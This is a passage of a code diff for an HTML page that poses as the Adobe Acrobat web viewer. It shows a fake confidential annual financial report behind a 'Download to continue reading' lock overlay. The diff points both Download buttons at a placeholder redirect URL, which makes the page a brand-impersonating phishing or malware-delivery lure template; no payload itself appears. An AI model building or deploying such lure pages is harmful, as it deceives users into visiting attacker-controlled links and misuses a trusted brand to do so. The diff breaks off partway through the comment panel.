@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Acrobat</title>
+    <title>Adobe Acrobat - PDF Viewer</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
         @page { size: A4; margin: 0; }
@@ -16,156 +16,160 @@
 
         body {
             font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #393939;
+            background: #2d2d2d;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            color: #e1e1e1;
+            color: #e0e0e0;
         }
 
-        /* ─── Global Header ─── */
+        /* Header */
         .app-header {
             background: #1b1b1f;
-            height: 48px;
+            height: 52px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 20px;
-            z-index: 10;
+            padding: 0 24px;
+            border-bottom: 1px solid #3a3a3a;
         }
 
-        .app-header-left {
+        .header-left {
             display: flex;
             align-items: center;
-            gap: 14px;
+            gap: 16px;
         }
 
-        .adobe-logo-mark {
+        .logo-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .adobe-logo {
+            width: 28px;
+            height: 24px;
+        }
+
+        .logo-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .header-divider {
+            width: 1px;
+            height: 24px;
+            background: #444;
+        }
+
+        .nav-tabs {
+            display: flex;
+            gap: 4px;
+        }
+
+        .nav-tab {
+            color: #a0a0a0;
+            font-size: 13px;
+            font-weight: 500;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.15s;
+        }
+
+        .nav-tab:hover {
+            color: #ffffff;
+            background: rgba(255,255,255,0.06);
+        }
+
+        .nav-tab.active {
+            color: #ffffff;
+            background: rgba(255,255,255,0.1);
+        }
+
+        .header-right {
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .adobe-logo-mark svg {
-            width: 24px;
-            height: 21px;
-        }
-
-        .adobe-logo-mark span {
-            font-size: 15px;
-            font-weight: 600;
-            color: #fff;
-        }
-
-        .header-sep {
-            width: 1px;
-            height: 20px;
-            background: #444;
-        }
-
-        .header-tabs {
-            display: flex;
-            gap: 4px;
-        }
-
-        .header-tab {
-            color: #b0b0b0;
-            font-size: 13px;
-            font-weight: 500;
-            padding: 6px 14px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: 0.15s;
-            text-decoration: none;
-        }
-
-        .header-tab:hover, .header-tab.active {
-            color: #fff;
-            background: rgba(255,255,255,0.08);
-        }
-
-        .header-tab.active {
-            background: rgba(255,255,255,0.12);
-        }
-
-        .app-header-right {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .header-icon-btn {
-            width: 32px;
-            height: 32px;
+        .header-icon {
+            width: 36px;
+            height: 36px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 6px;
             background: none;
             border: none;
-            color: #b0b0b0;
+            color: #a0a0a0;
             cursor: pointer;
-            transition: 0.15s;
+            transition: all 0.15s;
         }
 
-        .header-icon-btn:hover {
+        .header-icon:hover {
+            color: #ffffff;
             background: rgba(255,255,255,0.08);
-            color: #fff;
         }
 
-        .header-icon-btn svg {
-            width: 18px;
-            height: 18px;
+        .header-icon svg {
+            width: 20px;
+            height: 20px;
         }
 
-        .header-avatar {
-            width: 28px;
-            height: 28px;
+        .user-avatar {
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            background: #4b6cb7;
-            color: #fff;
+            background: linear-gradient(135deg, #5b7fde, #3a5fc8);
+            color: #ffffff;
             font-size: 12px;
             font-weight: 600;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
+            margin-left: 8px;
         }
 
-        /* ─── Toolbar ─── */
-        .doc-toolbar {
-            background: #2d2d31;
-            border-bottom: 1px solid #3e3e42;
-            height: 44px;
+        /* Toolbar */
+        .toolbar {
+            background: #252528;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0 16px;
+            padding: 0 20px;
+            border-bottom: 1px solid #3a3a3a;
         }
 
-        .doc-toolbar-left {
+        .toolbar-left {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
 
-        .doc-filename {
-            color: #d4d4d4;
-            font-size: 13px;
+        .filename {
+            color: #c8c8c8;
+            font-size: 14px;
             font-weight: 500;
-            max-width: 260px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
         }
 
-        .doc-toolbar-center {
+        .toolbar-center {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .page-nav {
             display: flex;
             align-items: center;
             gap: 6px;
         }
 
-        .page-nav-btn {
+        .page-btn {
             width: 28px;
             height: 28px;
             display: flex;
@@ -173,163 +177,154 @@
             justify-content: center;
             background: none;
             border: none;
-            color: #a0a0a0;
+            color: #888;
             border-radius: 4px;
             cursor: pointer;
-            transition: 0.15s;
         }
 
-        .page-nav-btn:hover {
-            background: rgba(255,255,255,0.06);
+        .page-btn:hover {
             color: #fff;
+            background: rgba(255,255,255,0.08);
         }
 
-        .page-nav-btn svg {
+        .page-btn svg {
             width: 16px;
             height: 16px;
         }
 
-        .page-indicator {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 12px;
-            color: #a0a0a0;
-        }
-
-        .page-indicator input {
-            width: 32px;
-            background: #1b1b1f;
-            border: 1px solid #4a4a4e;
+        .page-input {
+            width: 40px;
+            height: 28px;
+            background: #1a1a1d;
+            border: 1px solid #444;
             border-radius: 4px;
             color: #e0e0e0;
             text-align: center;
             font-size: 12px;
-            padding: 3px;
-            outline: none;
         }
 
-        .page-indicator input:focus {
-            border-color: #4b9dff;
+        .page-total {
+            color: #888;
+            font-size: 12px;
         }
 
-        .zoom-group {
+        .zoom-controls {
             display: flex;
             align-items: center;
             gap: 4px;
-            margin-left: 12px;
+            margin-left: 16px;
+            padding-left: 16px;
+            border-left: 1px solid #3a3a3a;
         }
 
-        .zoom-label {
+        .zoom-level {
+            color: #888;
             font-size: 12px;
-            color: #a0a0a0;
-            min-width: 36px;
+            min-width: 42px;
             text-align: center;
         }
 
-        .doc-toolbar-right {
+        .toolbar-right {
             display: flex;
             align-items: center;
             gap: 6px;
         }
 
-        .tb-action {
+        .tool-btn {
             display: flex;
             align-items: center;
             gap: 6px;
             background: none;
             border: none;
-            color: #c0c0c0;
+            color: #a0a0a0;
             font-size: 12px;
             font-weight: 500;
             padding: 6px 12px;
             border-radius: 6px;
             cursor: pointer;
-            transition: 0.15s;
+            transition: all 0.15s;
         }
 
-        .tb-action:hover {
-            background: rgba(255,255,255,0.06);
+        .tool-btn:hover {
             color: #fff;
+            background: rgba(255,255,255,0.08);
         }
 
-        .tb-action svg {
+        .tool-btn svg {
             width: 16px;
             height: 16px;
         }
 
-        .tb-action.primary {
+        .tool-btn.primary {
             background: #1473e6;
             color: #fff;
         }
 
-        .tb-action.primary:hover {
+        .tool-btn.primary:hover {
             background: #0d66d0;
         }
 
-        /* ─── Main Viewer Area ─── */
-        .viewer-container {
+        /* Main viewer area */
+        .viewer-main {
             flex: 1;
             display: flex;
             overflow: hidden;
         }
 
-        /* Thumbnails sidebar */
-        .thumb-sidebar {
-            width: 160px;
-            background: #2d2d31;
-            border-right: 1px solid #3e3e42;
+        /* Sidebar */
+        .sidebar {
+            width: 180px;
+            background: #252528;
+            border-right: 1px solid #3a3a3a;
             overflow-y: auto;
-            padding: 16px 12px;
+            padding: 16px;
             display: flex;
             flex-direction: column;
             gap: 12px;
-            flex-shrink: 0;
         }
 
-        .thumb-item {
-            background: #fff;
+        .thumb-page {
+            background: #ffffff;
             border-radius: 4px;
-            width: 100%;
-            aspect-ratio: 8.5/11;
-            position: relative;
+            padding: 10px 8px;
             cursor: pointer;
             border: 2px solid transparent;
-            transition: border 0.15s;
-            overflow: hidden;
-            padding: 8px;
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
+            transition: all 0.15s;
         }
 
-        .thumb-item.active {
+        .thumb-page:hover {
+            border-color: #555;
+        }
+
+        .thumb-page.active {
             border-color: #1473e6;
         }
 
-        .thumb-item:hover:not(.active) {
-            border-color: #666;
-        }
-
-        .thumb-item .mini-line {
-            height: 3px;
-            background: #d0d0d0;
+        .thumb-line {
+            height: 4px;
+            background: #ddd;
             border-radius: 2px;
+            margin-bottom: 5px;
         }
 
-        .thumb-item .mini-line.w90 { width: 90%; }
-        .thumb-item .mini-line.w80 { width: 80%; }
-        .thumb-item .mini-line.w70 { width: 70%; }
-        .thumb-item .mini-line.w60 { width: 60%; }
-        .thumb-item .mini-line.w95 { width: 95%; }
-        .thumb-item .mini-line.head { width: 50%; height: 5px; background: #aaa; margin-bottom: 3px; }
+        .thumb-line.head {
+            width: 45%;
+            height: 6px;
+            background: #bbb;
+            margin-bottom: 8px;
+        }
+
+        .thumb-line.w90 { width: 90%; }
+        .thumb-line.w85 { width: 85%; }
+        .thumb-line.w78 { width: 78%; }
+        .thumb-line.w95 { width: 95%; }
+        .thumb-line.w70 { width: 70%; }
 
         .thumb-num {
-            position: absolute;
-            bottom: 2px;
-            right: 4px;
             font-size: 9px;
-            color: #999;
+            color: #888;
+            text-align: center;
+            margin-top: 6px;
         }
 
         /* Document canvas */
@@ -338,498 +333,290 @@
             overflow: auto;
             display: flex;
             justify-content: center;
-            padding: 28px 20px;
+            padding: 32px 24px;
+            background: #404040;
         }
 
         .doc-page {
             background: #ffffff;
             width: 680px;
             min-height: 880px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.45);
+            box-shadow: 0 4px 24px rgba(0,0,0,0.4);
             border-radius: 2px;
             position: relative;
-            overflow: hidden;
             flex-shrink: 0;
         }
 
-        /* Realistic page content */
         .page-content {
-            padding: 52px 56px 40px;
+            padding: 56px 52px;
             color: #1a1a1a;
-            font-size: 13px;
-            line-height: 1.8;
         }
 
-        .page-content .doc-title {
-            font-size: 22px;
+        .doc-title {
+            font-size: 24px;
             font-weight: 700;
             color: #111;
-            margin-bottom: 6px;
-            letter-spacing: -0.3px;
-        }
-
-        .page-content .doc-subtitle {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 28px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .page-content .section-head {
-            font-size: 15px;
-            font-weight: 700;
-            color: #222;
-            margin-top: 24px;
             margin-bottom: 8px;
         }
 
-        .page-content p {
-            color: #333;
+        .doc-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 28px;
+            padding-bottom: 18px;
+            border-bottom: 1px solid #e8e8e8;
+        }
+
+        .section-heading {
+            font-size: 16px;
+            font-weight: 700;
+            color: #222;
+            margin-top: 28px;
             margin-bottom: 12px;
         }
 
-        .page-content .text-block {
+        .doc-para {
+            font-size: 13px;
+            line-height: 1.8;
             color: #333;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
         }
 
-        /* Blur overlay for gated content */
-        .blur-mask {
+        /* Content lock overlay */
+        .lock-overlay {
             position: absolute;
             left: 0;
             right: 0;
             bottom: 0;
-            height: 55%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.85) 30%, rgba(255,255,255,0.96) 100%);
-            display: flex;
-            align-items: flex-end;
-            justify-content: center;
-            padding-bottom: 60px;
-        }
-
-        .blur-mask-inner {
-            text-align: center;
-            max-width: 380px;
-        }
-
-        .blur-mask-inner .lock-icon {
-            width: 44px;
-            height: 44px;
-            background: #1473e6;
-            border-radius: 50%;
-            margin: 0 auto 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .blur-mask-inner .lock-icon svg {
-            width: 22px;
-            height: 22px;
-            fill: #fff;
-        }
-
-        .blur-mask-inner h4 {
-            font-size: 16px;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-        }
-
-        .blur-mask-inner p {
-            font-size: 13px;
-            color: #666;
-            margin-bottom: 18px;
-            line-height: 1.5;
-        }
-
-        .download-cta {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #1473e6;
-            color: #fff;
-            border: none;
-            border-radius: 20px;
-            padding: 11px 28px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .download-cta:hover {
-            background: #0d66d0;
-        }
-
-        .download-cta svg {
-            width: 16px;
-            height: 16px;
-        }
-
-        /* Right activity panel */
-        .activity-panel {
-            width: 260px;
-            background: #2d2d31;
-            border-left: 1px solid #3e3e42;
+            height: 60%;
+            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.9) 35%, rgba(255,255,255,0.98) 100%);
             display: flex;
             flex-direction: column;
-            flex-shrink: 0;
-        }
-
-        .panel-header {
-            padding: 14px 16px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #e0e0e0;
-            border-bottom: 1px solid #3e3e42;
-            display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: flex-end;
+            padding-bottom: 80px;
         }
 
-        .panel-header-tabs {
-            display: flex;
-            gap: 2px;
-        }
-
-        .panel-tab {
-            font-size: 12px;
-            color: #888;
-            padding: 4px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 500;
-        }
-
-        .panel-tab.active {
-            color: #fff;
-            background: rgba(255,255,255,0.08);
-        }
-
-        .panel-body {
-            flex: 1;
-            overflow-y: auto;
-            padding: 16px;
-        }
-
-        .comment-item {
-            margin-bottom: 16px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #3e3e42;
-        }
-
-        .comment-item:last-child {
-            border-bottom: none;
-        }
-
-        .comment-author {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 6px;
-        }
-
-        .comment-avatar {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            font-size: 10px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-        }
-
-        .comment-avatar.blue { background: #4b6cb7; }
-        .comment-avatar.green { background: #2e7d32; }
-        .comment-avatar.orange { background: #e67700; }
-
-        .comment-name {
-            font-size: 12px;
-            font-weight: 600;
-            color: #d0d0d0;
-        }
-
-        .comment-time {
-            font-size: 10px;
-            color: #777;
-            margin-left: auto;
-        }
-
-        .comment-text {
-            font-size: 12px;
-            color: #a0a0a0;
-            line-height: 1.5;
-        }
-
-        .panel-input-row {
-            padding: 12px 16px;
-            border-top: 1px solid #3e3e42;
-            display: flex;
-            gap: 8px;
-        }
-
-        .panel-input {
-            flex: 1;
-            background: #1b1b1f;
-            border: 1px solid #4a4a4e;
-            border-radius: 6px;
-            padding: 8px 12px;
-            font-size: 12px;
-            color: #ccc;
-            outline: none;
-        }
-
-        .panel-input:focus {
-            border-color: #1473e6;
-        }
-
-        .panel-send {
+        .lock-icon {
+            width: 56px;
+            height: 56px;
             background: #1473e6;
-            border: none;
-            border-radius: 6px;
-            width: 32px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
+            margin-bottom: 18px;
         }
 
-        .panel-send svg {
-            width: 16px;
-            height: 16px;
+        .lock-icon svg {
+            width: 26px;
+            height: 26px;
             fill: #fff;
         }
 
-        /* ─── Footer / Status Bar ─── */
-        .status-bar {
+        .lock-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .lock-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: center;
+            max-width: 320px;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: #1473e6;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 14px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .download-btn:hover {
+            background: #0d66d0;
+            box-shadow: 0 6px 20px rgba(20, 115, 230, 0.3);
+        }
+
+        .download-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Footer */
+        .footer-bar {
             background: #1b1b1f;
-            padding: 6px 20px;
+            padding: 8px 24px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             font-size: 11px;
-            color: #777;
+            color: #666;
         }
 
-        /* Print */
+        /* Print styles */
         @media print {
             body { background: #fff; }
-            .app-header, .doc-toolbar, .thumb-sidebar, .activity-panel, .status-bar, .blur-mask { display: none; }
-            .viewer-container { display: block; }
-            .doc-canvas { padding: 0; }
+            .app-header, .toolbar, .sidebar, .footer-bar, .lock-overlay { display: none; }
+            .viewer-main { display: block; }
+            .doc-canvas { padding: 0; background: #fff; }
             .doc-page { box-shadow: none; width: 100%; }
-            .page-content { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
-    <!-- ─── App Header ─── -->
-    <div class="app-header">
-        <div class="app-header-left">
-            <div class="adobe-logo-mark">
-                <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <!-- Header -->
+    <header class="app-header">
+        <div class="header-left">
+            <div class="logo-group">
+                <svg class="adobe-logo" viewBox="0 0 30 26" fill="none">
                     <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                     <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                     <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
                 </svg>
-                <span>Acrobat</span>
+                <span class="logo-text">Acrobat</span>
             </div>
-            <div class="header-sep"></div>
-            <div class="header-tabs">
-                <span class="header-tab">Home</span>
-                <span class="header-tab active">Documents</span>
-                <span class="header-tab">All tools</span>
-            </div>
+            <div class="header-divider"></div>
+            <nav class="nav-tabs">
+                <a class="nav-tab" href="#">Home</a>
+                <a class="nav-tab active" href="#">Documents</a>
+                <a class="nav-tab" href="#">All tools</a>
+            </nav>
         </div>
-        <div class="app-header-right">
-            <button class="header-icon-btn" title="Notifications">
+        <div class="header-right">
+            <button class="header-icon" title="Notifications">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>
             </button>
-            <button class="header-icon-btn" title="Help">
+            <button class="header-icon" title="Help">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
             </button>
-            <div class="header-avatar">JD</div>
+            <div class="user-avatar">JD</div>
         </div>
-    </div>
+    </header>
 
-    <!-- ─── Document Toolbar ─── -->
-    <div class="doc-toolbar">
-        <div class="doc-toolbar-left">
-            <span class="doc-filename">Quarterly_Financial_Report_Q1_2026.pdf</span>
+    <!-- Toolbar -->
+    <div class="toolbar">
+        <div class="toolbar-left">
+            <span class="filename">Annual_Report_2026.pdf</span>
         </div>
-        <div class="doc-toolbar-center">
-            <button class="page-nav-btn" title="Previous page">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
-            </button>
-            <div class="page-indicator">
-                <input type="text" value="1" readonly> <span>/ 18</span>
+        <div class="toolbar-center">
+            <div class="page-nav">
+                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg></button>
+                <input type="text" class="page-input" value="1" readonly>
+                <span class="page-total">/ 24</span>
+                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></button>
             </div>
-            <button class="page-nav-btn" title="Next page">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
-            </button>
-            <div class="zoom-group">
-                <button class="page-nav-btn" title="Zoom out">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg>
-                </button>
-                <span class="zoom-label">100%</span>
-                <button class="page-nav-btn" title="Zoom in">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
-                </button>
+            <div class="zoom-controls">
+                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+                <span class="zoom-level">100%</span>
+                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
             </div>
         </div>
-        <div class="doc-toolbar-right">
-            <button class="tb-action" onclick="handleAction()">
+        <div class="toolbar-right">
+            <button class="tool-btn">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.85 2.85 0 114 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
                 Comment
             </button>
-            <button class="tb-action" onclick="handleAction()">
+            <button class="tool-btn">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
                 Share
             </button>
-            <button class="tb-action primary" onclick="handleAction()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            <button class="tool-btn primary" onclick="window.location.href='REDIRECT_URL_HERE'">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                 Download
             </button>
         </div>
     </div>
 
-    <!-- ─── Main Viewer ─── -->
-    <div class="viewer-container">
-        <!-- Thumbnails -->
-        <div class="thumb-sidebar">
-            <div class="thumb-item active">
-                <div class="mini-line head"></div>
-                <div class="mini-line w95"></div>
-                <div class="mini-line w90"></div>
-                <div class="mini-line w80"></div>
-                <div class="mini-line w95"></div>
-                <div class="mini-line w70"></div>
-                <span class="thumb-num">1</span>
+    <!-- Main viewer -->
+    <main class="viewer-main">
+        <!-- Sidebar thumbnails -->
+        <aside class="sidebar">
+            <div class="thumb-page active">
+                <div class="thumb-line head"></div>
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w90"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w78"></div>
+                <div class="thumb-num">1</div>
             </div>
-            <div class="thumb-item">
-                <div class="mini-line head" style="width:40%"></div>
-                <div class="mini-line w90"></div>
-                <div class="mini-line w95"></div>
-                <div class="mini-line w80"></div>
-                <div class="mini-line w90"></div>
-                <div class="mini-line w60"></div>
-                <span class="thumb-num">2</span>
+            <div class="thumb-page">
+                <div class="thumb-line head" style="width:35%"></div>
+                <div class="thumb-line w90"></div>
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-line w90"></div>
+                <div class="thumb-line w70"></div>
+                <div class="thumb-num">2</div>
             </div>
-            <div class="thumb-item">
-                <div class="mini-line w95"></div>
-                <div class="mini-line w80"></div>
-                <div class="mini-line w90"></div>
-                <div class="mini-line w95"></div>
-                <div class="mini-line w70"></div>
-                <div class="mini-line w90"></div>
-                <span class="thumb-num">3</span>
+            <div class="thumb-page">
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-line w90"></div>
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w78"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-num">3</div>
             </div>
-            <div class="thumb-item">
-                <div class="mini-line head"></div>
-                <div class="mini-line w90"></div>
-                <div class="mini-line w80"></div>
-                <div class="mini-line w95"></div>
-                <div class="mini-line w60"></div>
-                <div class="mini-line w80"></div>
-                <span class="thumb-num">4</span>
+            <div class="thumb-page">
+                <div class="thumb-line head"></div>
+                <div class="thumb-line w90"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-line w95"></div>
+                <div class="thumb-line w70"></div>
+                <div class="thumb-line w85"></div>
+                <div class="thumb-num">4</div>
             </div>
-        </div>
+        </aside>
 
         <!-- Document -->
-        <div class="doc-canvas">
-            <div class="doc-page">
+        <section class="doc-canvas">
+            <article class="doc-page">
                 <div class="page-content">
-                    <div class="doc-title">Quarterly Financial Report</div>
-                    <div class="doc-subtitle">Q1 2026 &mdash; Prepared for Stakeholders &middot; Confidential</div>
+                    <h1 class="doc-title">Annual Financial Report</h1>
+                    <p class="doc-subtitle">Fiscal Year 2026 &mdash; Confidential Document</p>
 
-                    <div class="section-head">1. Executive Summary</div>
-                    <p>This report provides a comprehensive overview of the company's financial performance during the first quarter of 2026. Revenue grew by 12.4% year-over-year, driven by strong performance in our cloud services division and expansion into new markets across the Asia-Pacific region.</p>
-                    <p>Operating expenses remained within projected limits at $42.3M, reflecting disciplined cost management and operational efficiency improvements implemented in the prior fiscal year.</p>
+                    <h2 class="section-heading">1. Executive Summary</h2>
+                    <p class="doc-para">This comprehensive report provides stakeholders with a detailed analysis of our company's financial performance throughout fiscal year 2026. Our strategic initiatives have yielded significant growth across all major business segments.</p>
+                    <p class="doc-para">Revenue increased by 18.7% year-over-year, driven primarily by expansion in emerging markets and successful product launches. Operating margins improved to 24.3%, reflecting our continued focus on operational efficiency.</p>
 
-                    <div class="section-head">2. Revenue Analysis</div>
-                    <p>Total revenue for Q1 2026 reached $187.6 million, exceeding analyst expectations by 3.2%. The breakdown by business unit is as follows:</p>
-                    <p>&bull; Cloud Services: $98.4M (+18.7% YoY)<br>
-                       &bull; Enterprise Solutions: $52.1M (+6.3% YoY)<br>
-                       &bull; Professional Services: $37.1M (+4.1% YoY)</p>
-
-                    <div class="section-head">3. Operating Expenses</div>
-                    <p>Total operating expenses for the quarter were $142.8 million, representing a 7.2% increase from the same period last year. Key contributors included investments in research and development...</p>
+                    <h2 class="section-heading">2. Revenue Analysis</h2>
+                    <p class="doc-para">Total consolidated revenue reached $4.82 billion for the fiscal year, exceeding analyst expectations by 6.2%. The breakdown by business segment demonstrates strong performance across the portfolio:</p>
+                    <p class="doc-para">• Enterprise Solutions: $2.14B (+22.1% YoY)<br>• Cloud Services: $1.68B (+31.4% YoY)<br>• Professional Services: $0.72B (+8.3% YoY)<br>• Licensing: $0.28B (+4.6% YoY)</p>
                 </div>
 
-                <!-- Gated content overlay -->
-                <div class="blur-mask">
-                    <div class="blur-mask-inner">
-                        <div class="lock-icon">
-                            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
-                        </div>
-                        <h4>Download to continue reading</h4>
-                        <p>This document is view-protected. Download the full PDF to access all 18 pages.</p>
-                        <button class="download-cta" onclick="handleAction()">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                            Download PDF
-                        </button>
+                <!-- Lock overlay -->
+                <div class="lock-overlay">
+                    <div class="lock-icon">
+                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
                     </div>
+                    <h3 class="lock-title">Download to continue reading</h3>
+                    <p class="lock-text">This document is protected. Download the full PDF to access all 24 pages.</p>
+                    <button class="download-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        Download PDF
+                    </button>
                 </div>
-            </div>
-        </div>
+            </article>
+        </section>
+    </main>
 
-        <!-- Activity Panel -->
-        <div class="activity-panel">
-            <div class="panel-header">
-                <div class="panel-header-tabs">
-                    <span class="panel-tab active">Comments</span>
-                    <span class="panel-tab">Activity</span>
-                </div>
-            </div>
-            <div class="panel-body">
-                <div class="comment-item">
-                    <div class="comment-author">
-                        <div class="comment-avatar blue">JS</div>
-                        <span class="comment-name">James Sullivan</span>
-                        <span class="comment-time">2h ago</span>
-                    </div>
